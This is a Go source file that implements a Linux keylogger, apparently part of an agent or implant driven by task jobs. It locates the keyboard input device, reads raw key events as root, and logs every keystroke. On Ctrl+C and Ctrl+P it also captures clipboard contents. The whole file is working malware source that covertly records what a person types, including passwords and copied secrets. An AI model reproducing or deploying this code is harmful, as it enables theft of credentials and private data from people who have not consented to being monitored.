// +build linux

// This is taken from MarinX/keylogger
package keystate

import (
	"bytes"
	"encoding/binary"
	"errors"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"strings"
	"syscall"
	"unicode"
	"unsafe"

	"keylog/clipboard"
)

const (
	// EvSyn is used as markers to separate events. Events may be separated in time or in space, such as with the multitouch protocol.
	EvSyn EventType = 0x00
	// EvKey is used to describe state changes of keyboards, buttons, or other key-like devices.
	EvKey EventType = 0x01
	// EvRel is used to describe relative axis value changes, e.g. moving the mouse 5 units to the left.
	EvRel EventType = 0x02
	// EvAbs is used to describe absolute axis value changes, e.g. describing the coordinates of a touch on a touchscreen.
	EvAbs EventType = 0x03
	// EvMsc is used to describe miscellaneous input data that do not fit into other types.
	EvMsc EventType = 0x04
	// EvSw is used to describe binary state input switches.
	EvSw EventType = 0x05
	// EvLed is used to turn LEDs on devices on and off.
	EvLed EventType = 0x11
	// EvSnd is used to output sound to devices.
	EvSnd EventType = 0x12
	// EvRep is used for autorepeating devices.
	EvRep EventType = 0x14
	// EvFf is used to send force feedback commands to an input device.
	EvFf EventType = 0x15
	// EvPwr is a special type for power button and switch input.
	EvPwr EventType = 0x16
	// EvFfStatus is used to receive force feedback device status.
	EvFfStatus EventType = 0x17
)

// EventType are groupings of codes under a logical input construct.
// Each type has a set of applicable codes to be used in generating events.
// See the Ev section for details on valid codes for each type
type EventType uint16

// eventsize is size of structure of InputEvent
var eventsize = int(unsafe.Sizeof(InputEvent{}))

// InputEvent is the keyboard event structure itself
type InputEvent struct {
	Time  syscall.Timeval
	Type  EventType
	Code  uint16
	Value int32
}

// KeyString returns representation of pressed key as string
// eg enter, space, a, b, c...
func (i *InputEvent) KeyString() string {
	return keyCodeMap[i.Code]
}

// KeyPress is the value when we press the key on keyboard
func (i *InputEvent) KeyPress() bool {
	return i.Value == 1
}

// KeyRelease is the value when we release the key on keyboard
func (i *InputEvent) KeyRelease() bool {
	return i.Value == 0
}

type KeyLogger struct {
	fd *os.File
}

// New creates a new keylogger for a device path
func New(devPath string) (*KeyLogger, error) {
	k := &KeyLogger{}
	if !k.IsRoot() {
		return nil, errors.New("Must be run as root")
	}
	fd, err := os.Open(devPath)
	k.fd = fd
	return k, err
}

// FindKeyboardDevice by going through each device registered on OS
// Mostly it will contain keyword - keyboard
// Returns the file path which contains events
func FindKeyboardDevice() string {
	path := "/sys/class/input/event%d/device/name"
	resolved := "/dev/input/event%d"

	for i := 0; i < 255; i++ {
		buff, err := ioutil.ReadFile(fmt.Sprintf(path, i))
		if err != nil {
			log.Println(err.Error())
		}
		if strings.Contains(strings.ToLower(string(buff)), "keyboard") {
			return fmt.Sprintf(resolved, i)
		}
	}
	return ""
}

// IsRoot checks if the process is run with root permission
func (k *KeyLogger) IsRoot() bool {
	return syscall.Getuid() == 0 && syscall.Geteuid() == 0
}

// Read from file descriptor
// Blocking call, returns channel
// Make sure to close channel when finish
func (k *KeyLogger) Read() chan InputEvent {
	event := make(chan InputEvent)
	go func(event chan InputEvent) {
		for {
			e, err := k.read()
			if err != nil {
				log.Println(err.Error())
				close(event)
				break
			}

			if e != nil {
				event <- *e
			}
		}
	}(event)
	return event
}

// read from file description and parse binary into go struct
func (k *KeyLogger) read() (*InputEvent, error) {
	buffer := make([]byte, eventsize)
	n, err := k.fd.Read(buffer)
	if err != nil {
		return nil, err
	}
	// no input, dont send error
	if n <= 0 {
		return nil, nil
	}
	return k.eventFromBuffer(buffer)
}

// eventFromBuffer parser bytes into InputEvent struct
func (k *KeyLogger) eventFromBuffer(buffer []byte) (*InputEvent, error) {
	event := &InputEvent{}
	err := binary.Read(bytes.NewBuffer(buffer), binary.LittleEndian, event)
	return event, err
}

// Close file descriptor
func (k *KeyLogger) Close() error {
	if k.fd == nil {
		return nil
	}
	return k.fd.Close()
}

var keyCodeMap = map[uint16]string{
	1:   "ESC",
	2:   "1",
	3:   "2",
	4:   "3",
	5:   "4",
	6:   "5",
	7:   "6",
	8:   "7",
	9:   "8",
	10:  "9",
	11:  "0",
	12:  "-",
	13:  "=",
	14:  "BS",
	15:  "TAB",
	16:  "Q",
	17:  "W",
	18:  "E",
	19:  "R",
	20:  "T",
	21:  "Y",
	22:  "U",
	23:  "I",
	24:  "O",
	25:  "P",
	26:  "[",
	27:  "]",
	28:  "ENTER",
	29:  "L_CTRL",
	30:  "A",
	31:  "S",
	32:  "D",
	33:  "F",
	34:  "G",
	35:  "H",
	36:  "J",
	37:  "K",
	38:  "L",
	39:  ";",
	40:  "'",
	41:  "`",
	42:  "L_SHIFT",
	43:  "\\",
	44:  "Z",
	45:  "X",
	46:  "C",
	47:  "V",
	48:  "B",
	49:  "N",
	50:  "M",
	51:  ",",
	52:  ".",
	53:  "/",
	54:  "R_SHIFT",
	55:  "*",
	56:  "L_ALT",
	57:  "SPACE",
	58:  "CAPS_LOCK",
	59:  "F1",
	60:  "F2",
	61:  "F3",
	62:  "F4",
	63:  "F5",
	64:  "F6",
	65:  "F7",
	66:  "F8",
	67:  "F9",
	68:  "F10",
	69:  "NUM_LOCK",
	70:  "SCROLL_LOCK",
	71:  "HOME",
	72:  "UP_8",
	73:  "PGUP_9",
	74:  "-",
	75:  "LEFT_4",
	76:  "5",
	77:  "RT_ARROW_6",
	78:  "+",
	79:  "END_1",
	80:  "DOWN",
	81:  "PGDN_3",
	82:  "INS",
	83:  "DEL",
	84:  "",
	85:  "",
	86:  "",
	87:  "F11",
	88:  "F12",
	89:  "",
	90:  "",
	91:  "",
	92:  "",
	93:  "",
	94:  "",
	95:  "",
	96:  "R_ENTER",
	97:  "R_CTRL",
	98:  "/",
	99:  "PRT_SCR",
	100: "R_ALT",
	101: "",
	102: "Home",
	103: "Up",
	104: "PgUp",
	105: "Left",
	106: "Right",
	107: "End",
	108: "Down",
	109: "PgDn",
	110: "Insert",
	111: "Del",
	112: "",
	113: "",
	114: "",
	115: "",
	116: "",
	117: "",
	118: "",
	119: "Pause",
}

func keystateMonitor(k *KeyLogger) {
	defer k.Close()

	// Create temp file for recording results.
	// tmpfile, err := ioutil.TempFile("/tmp/", "tmp.")
	// if err != nil {
	// 	log.Fatal(err)
	// }

	// logrus.Println("Initialized log file:", tmpfile.Name())

	events := k.Read()

	l_cntrl := false
	c := false
	shift := false
	capslock := false
	var keychar string
	// range of events
	// logrus.Println("Initialized. Listening for events...")
	for e := range events {
		if *curTask.Job.Stop > 0 {
			break
		}
		switch e.Type {
		// EvKey is used to describe state changes of keyboards, buttons, or other key-like devices.
		// check the input_event.go for more events
		case EvKey:

			// if the state of key is pressed
			if e.KeyPress() {
				keychar = e.KeyString()
				if keychar == "L_CTRL" {
					l_cntrl = true
				} else if keychar == "C" && l_cntrl {
					c = true
				} else if l_cntrl && keychar != "C" {
					l_cntrl = false
					c = false
				} else if keychar == "L_SHIFT" || keychar == "R_SHIFT" {
					shift = true
				} else if keychar == "CAPS_LOCK" {
					capslock = !capslock
				}
				if keychar == "SPACE" {
					ksmonitor.AddKeyStrokes(" ")
					// fmt.Print(" ")
				} else {
					if len(keychar) > 1 && keychar != "L_SHIFT" && keychar != "R_SHIFT" {
						ksmonitor.AddKeyStrokes("[" + keychar + "]")
						// fmt.Printf("[%s]", keychar)
					} else {
						if l_cntrl && c {
							contents, err := clipboard.ReadAll()
							if err == nil {
								ksmonitor.AddKeyStrokes("[COPY]" + contents + "[/COPY]")
							} else {
								log.Println(err.Error())
							}
						} else if l_cntrl && keychar == "P" {
							contents, err := clipboard.ReadAll()
							if err == nil {
								ksmonitor.AddKeyStrokes("[PASTE]" + contents + "[/PASTE]")
							} else {
								log.Println(err.Error())
							}
						} else if shift {
							if IsLetter(keychar) {
								ksmonitor.AddKeyStrokes(keychar)
								// fmt.Print(keychar)
							} else {
								ksmonitor.AddKeyStrokes(shiftMap[strings.ToLower(keychar)])
								// fmt.Print(shiftMap[keychar])
							}
						} else if capslock {
							ksmonitor.AddKeyStrokes(keychar)
							// fmt.Print(keychar)
						} else {
							ksmonitor.AddKeyStrokes(strings.ToLower(keychar))
							// fmt.Print(strings.ToLower(keychar))
						}
					}
				}
				if keychar == "ENTER" {
					ksmonitor.AddKeyStrokes("\n")
				}
				// logrus.Println("[event] press key ", e.KeyString())
			}

			// if the state of key is released
			if e.KeyRelease() {
				keychar = e.KeyString()
				if keychar == "L_SHIFT" || keychar == "R_SHIFT" {
					shift = false
				}
				// logrus.Println("[event] release key ", e.KeyString())
			}

			break
		}
	}
}

func keyLogger() error {
	keyboard := FindKeyboardDevice()

	// check if we found a path to keyboard
	if len(keyboard) <= 0 {
		return errors.New("No keyboard found...you will need to provide manual input path")
	}

	// logrus.Println("Found a keyboard at", keyboard)
	// init keylogger with keyboard
	k, err := New(keyboard)
	if err != nil {
		return err
	}
	go keystateMonitor(k)
	return nil
}

func IsLetter(s string) bool {
	for _, r := range s {
		if !unicode.IsLetter(r) {
			return false
		}
	}
	return true
}
